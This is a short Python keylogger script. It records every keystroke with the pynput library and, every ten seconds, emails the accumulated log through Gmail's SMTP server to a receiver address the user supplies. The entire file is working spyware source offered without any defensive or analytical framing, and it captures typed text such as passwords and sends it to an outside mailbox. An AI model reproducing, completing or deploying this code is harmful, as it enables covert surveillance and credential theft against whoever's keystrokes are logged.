from pynput import keyboard
import smtplib
import threading
from time import sleep

log=""
condition = True

def logger(key):
    global condition
    global log
    if key == keyboard.Key.space:
        log = log + " "

    elif key == keyboard.Key.ctrl_l:
        log = log +"[ ctrl_l ]"

    elif key == keyboard.Key.ctrl_r:
        log = log +"[ ctrl_r ]"

    elif key == keyboard.Key.backspace:
        log = log +" [backspace] "
    
    elif key == keyboard.Key.caps_lock:
        pass

    elif key == keyboard.Key.esc:
        condition = False
        return False
    
    elif key == keyboard.Key.alt_l:
        log = log +"[Alt_l]"

    elif key == keyboard.Key.alt_r:
        log = log +"[Alt_r]"

    elif key == keyboard.Key.shift:
        pass

    elif key == keyboard.Key.enter:
        pass

    elif key == keyboard.Key.cmd:
        pass
    
    elif key == keyboard.Key.tab:
        log = log +"[ Tab ]"
    
    else:
        log = log + key.char

# Remember to turn on

def Sent_mail():
    sender = "<Sender's Email>"     #Both sender's and receiver's mail can be same.
    passwd = ""
    Receicer = [""]
    message = log

    try:
        conn = smtplib.SMTP_SSL('smtp.gmail.com',465)
        conn.login(sender,passwd)
        print("Sending Started")
        conn.sendmail(sender,Receicer,message)
        conn.close()
        print("Send Successfully")
    except:
        print("Sorry Not able to send")
        print(log)
    
def logg():
    with keyboard.Listener(on_press = logger) as typer:
        typer.join()

keyboard_typer = threading.Thread(target=logg)
keyboard_typer.start()

while condition:
    sleep(10)
    Sender = threading.Thread(target=Sent_mail)
    Sender.start()